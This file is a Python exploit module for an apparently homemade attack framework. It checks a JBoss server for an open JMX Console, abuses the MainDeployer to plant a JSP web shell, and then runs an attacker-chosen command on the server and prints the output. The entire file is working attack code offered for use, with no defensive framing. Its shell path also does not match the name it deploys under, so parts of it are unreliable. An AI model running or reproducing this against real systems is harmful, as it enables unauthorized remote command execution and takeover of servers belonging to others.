import requests
import time
from urllib.parse import urljoin
from core.base_module import BaseModule
from rich.console import Console

class JbossJmxConsole(BaseModule):
    """Deploys a JSP shell via an unprotected JBoss JMX Console."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'RHOST': ['', 'The target host IP address or domain.'],
            'RPORT': [8080, 'The target JBoss port.'],
            'CMD': ['id', 'The command to execute via the JSP shell.']
        }

    def run(self, options):
        """
        Executes the JBoss JMX Console exploit.
        """
        rhost = options.get('RHOST')
        rport = int(options.get('RPORT'))
        cmd = options.get('CMD')
        console = Console()

        if not rhost:
            console.print("[!] RHOST must be set.", style="bold red")
            return

        base_url = f"http://{rhost}:{rport}"
        jmx_console_url = urljoin(base_url, "/jmx-console/")
        shell_name = "pysploitx_shell"
        jsp_shell_payload = f'<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) {{ Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) {{ out.println(disr); disr = dis.readLine(); }} }} %>'

        console.print(f"[*] Targeting JBoss at {base_url}")

        try:
            # 1. Check if JMX console is accessible
            console.print(f"[*] Checking for open JMX console at {jmx_console_url}")
            res = requests.get(jmx_console_url, timeout=10)
            if res.status_code != 200:
                console.print(f"[!] JMX console not found or not accessible (Status: {res.status_code}).", style="bold red")
                return
            console.print("[*] JMX console is accessible.")

            # 2. Deploy the JSP shell using the MainDeployer
            deployer_url = urljoin(base_url, "/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service%3DMainDeployer&methodName=deploy&argType=java.lang.String&arg0=pysploit.war&argType=java.lang.String&arg1=pysploit&argType=boolean&arg2=true&argType=java.lang.String&arg3=.jsp&argType=java.lang.String&arg4={jsp_shell_payload}&argType=boolean&arg5=true")
            deployer_url = deployer_url.format(jsp_shell_payload=requests.utils.quote(jsp_shell_payload))
            console.print("[*] Attempting to deploy JSP shell via MainDeployer...")
            res = requests.get(deployer_url, timeout=20)
            if res.status_code != 200 or "Deployed" not in res.text:
                console.print(f"[!] Failed to deploy shell. The server may not be vulnerable. (Status: {res.status_code})", style="bold red")
                return
            
            console.print(f"[bold green][+] JSP shell deployed successfully as '{shell_name}.jsp'[/bold green]")
            time.sleep(3) # Give the server a moment to deploy

            # 3. Execute the command via the shell
            shell_url = urljoin(base_url, f"/{shell_name}/{shell_name}.jsp")
            console.print(f"[*] Executing command via shell: {shell_url}?cmd={cmd}")
            res = requests.get(shell_url, params={'cmd': cmd}, timeout=15)
            if res.status_code == 200 and res.text.strip():
                console.print("[bold green][+] Command executed successfully![/bold green]")
                console.print(f"--- Command Output ---\n{res.text.strip()}\n----------------------")
            else:
                console.print(f"[!] Failed to execute command. (Status: {res.status_code})", style="bold red")

        except requests.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
